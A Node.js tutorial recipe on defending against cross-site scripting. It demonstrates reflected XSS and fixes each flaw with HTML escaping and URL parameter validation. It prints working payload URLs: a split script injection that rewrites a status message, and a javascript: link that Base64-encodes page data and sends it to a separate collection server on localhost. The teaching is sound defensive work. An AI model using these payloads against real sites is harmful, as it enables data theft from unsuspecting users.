# Guarding against cross-site scripting

XSS attacks are client-side injection attacks where malicious scripts are injected into websites. XSS
vulnerabilities are very dangerous as they can compromise trusted websites.

Here we’re going to demonstrate an XSS vulnerability and learn how we can protect against
them. We’ll be using the `he` (<https://www.npmjs.com/package/he>) `npm` module to do so.

1. First, start the server with the following command: `$ node server.js`
2. The server is emulating a service status web page. The web page accepts three
   parameters: `previous`, `token`, and `lang`. It’s common practice to have parameters
   such as these injected into URLs in real-world web applications. Navigate to
   <http://localhost:3000/?previous=/&token=TOKEN&lang=en>; where it should say 'All systems are running'.
3. Now, we can craft an XSS attack. We will craft a URL that will inject parameters to change the
   service status message to `All systems are down!`. We’re aiming to inject the following
   JavaScript via the URL parameters:
   ```JavaScript
   document.getElementById("status").innerHTML="All systems are down!";
   ```
4. We can inject this script using the following HTTP request:
   <http://localhost:3000/?previous=%22%3E%3Cscri&token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&lang=script%3E%20%3Ca%20href=%22/>
5. Now, the web page will show All systems are down!. So, visitors to our legitimate service
   status page will see a malicious message. These attacks typically send the malicious URL to an
   unsuspecting consumer of the website.
6. We can see the code that’s been injected by using the **View Page Source** interface in your
   browser.

7. To fix the application, we need to escape/sanitize the input. To escape or sanitize the input, we’ll use a module named `he`.
   Start the fixed server:

   ```Bash
   $ node fixed-server.js
   Server listening on port 3000
   ```

8. Attempt to access the malicious URL again:
   <http://localhost:3000/?previous=%22%3E%3Cscri&token=pt%3Edocument.getElementById(%22status%22).innerHTML=%22All%20systems%20are%20down!%22;%3C&lang=script%3E%20%3Ca%20href=%22/>
9. Observe that this time, we get the expected **All systems are running**. output. Our injection
   attack no longer works!

With that, we’ve learned how to use the `he` module to prevent an XSS attack.

## How it works…

XSS attacks are client-side injection attacks where malicious scripts are injected into trusted websites.
The general flow of an XSS attack is as follows:

1. Malicious input enters the application – typically via a web request.

2. The input is rendered as dynamic content on the web page because the input hasn’t been
   sanitized appropriately.

The two main types of XSS attacks are persistent XSS and reflected XSS. With persistent XSS attacks,
malicious data is injected into a persistence layer of the system. For example, it could be injected into
a field within a database.

Reflected XSS attacks are reliant on a single interaction with the server – for example, sending a single
HTTP request. The attack demonstrated in this recipe was a reflected XSS attack sent over an HTTP
request containing malicious input.

The exploit in this recipe was due to the way the `href` value was formulated for the **Back** link. We
started the injection process by assigning the `%22%3E%3Cscri` value, which, when decoded, is
equal to `"><scri`. This value closes an HTML anchor tag and starts an HTML script element that’s
ready to inject our script. The remaining values are set to inject the following code into the web page:
`"><script>document.getElementById("status").innerHTML="All systems are down!";</script> <a href="`
Note that the attack wouldn’t have worked with a single parameter as many modern browsers have
built-in XSS auditors to prevent the obvious injection of `<script>` tags.

**Important note:**
You can use Node.js’s `decodeURI()` method to decode encoded URIs. For example, `$ node -p "decodeURI('%22%3E%3Cscri')"` would output `"><scri`.

We fixed this vulnerability using the `he` module. We use the `he` module’s `encode()` function to do
so. This function accepts text that’s expected to be HTML or XML input and returns it in escaped form.
This is how we sanitize the input and stop the `<script>` tag from being injected into the web page.

All input to our server should be validated and sanitized before use. This includes indirect inputs to
data stores as these may be used to conduct persistent XSS attacks.

## There’s more…

There are some other types of XSS attacks that we can still use to harm our server. Let’s demonstrate
these attacks and learn how we can help prevent them.

### Protocol-handler XSS

The fixed server from this recipe is still vulnerable to some other types of XSS. In this scenario, we’ll
pretend that the status value is privileged information that the attacker shouldn’t be able to read.

The flow of this attack is to create a malicious data collection server that injects a script into the web
page that obtains the information and then forwards it to the data collection server.

1. We can start the data collection server:
   ```Bash
   $ node collection-server.js
   Collection Server listening on port 3001
   ```
2. In a second terminal window, restart the `fixed-server.js` file:
   ```Bash
   $ node fixed-server.js
   Server listening on port 3000
   ```
3. In your browser window, visit the following URL:
   <http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/&token=TOKEN&lang=en>

4. The web page should look the same as before, still showing the `All systems are running.`
   message. However, the XSS injection has updated the `href` value of the **Back** hyperlink so
   that it directs us to the following:
   ` javascript:(new Image().src)=``http://localhost:3001/attack/${btoa(document.getElementById(status).innerHTML)}``,0/ `
   The link starts with `javascript:`, which is a protocol handler that allows JavaScript execution
   as a URI. When this link is clicked, an HTML image element (`<img>`) is created with the `src`
   value set to the address of our data collection server. The `btoa()` function Base64 encodes
   the value of the status. Here, `,0` is appended to the end to cause the expression to evaluate to
   `false` – ensuring that the image isn’t rendered.
5. Click the **Back** link and check the data collection server. You’ll see that the status has been
   received, as follows:
   ```Bash
   $ node collection-server.js
   ::1 All systems are running.
   ```
   To highlight the dangers of these attacks, imagine that this was real privileged data, such as
   credentials or tokens. By just sending a malicious link to a user and having them click on it,
   we could obtain their sensitive data via our collection server.

The server is still vulnerable because we can still inject values into the `href` attribute. The
safest way to avoid this is by not allowing input to determine the value of the `href` attribute.

We’ll fix this vulnerability by installing the `escape-html` module!

Start `protocol-safe-server.js`:

```Bash
$ node protocol-safe-server.js
Server listening on port 3000
```

With the data collection server still running, revisit the malicious URL and click **Back**:
<http://localhost:3000/?previous=javascript:(new%20Image().src)=`http://localhost:3001/attack/${btoa(document.getElementById(%22status%22).innerHTML)}`,0/>

You’ll observe that the request fails, and the data collection server doesn’t receive the privileged data.
This is because the link to our malicious server has been sanitized.

**Important note:**
This chapter covered HTML encoding and modules that can be used to help escape HTML.
Similarly, for escaping JavaScript, the jsesc module (<https://www.npmjs.com/package/jsesc>) could be used.
However, embedding input into JavaScript is generally
considered high risk, so you should evaluate your reasons for doing so.

### Parameter validation

The browser can only show a portion of a very long URL in the address bar. This means that for very
long URLs with many parameters, you may not see what’s appended to the end of the URL. This makes
it more challenging to identify malicious URLs.

If your application’s typical usage doesn’t involve very long URLs, then it would be prudent to add
some constraints to what URLs your application will accept.

Start `constraints-server.js`:

```Bash
$ node constraints-server.js
Server listening on port 3000
```

Test by navigating to the following URLs, all of which should fail validation checks:

- <http://localhost:3000/?previous=sixteencharacter&token=six-teencharacter>

- <http://localhost:3000/?previous=sixteencharacter&token=six-teencharacter&lang=en&extra=value>

- <http://localhost:3000/?previous=characters&token=sixteenchar-acter&lang=abc>

The following URL should work as it satisfies all of the constraints:

- <http://localhost:3000/?previous=sixteencharacter&token=six-teencharacter&lang=en>

Any user input should be escaped and validated where possible to help prevent XSS injection attacks.
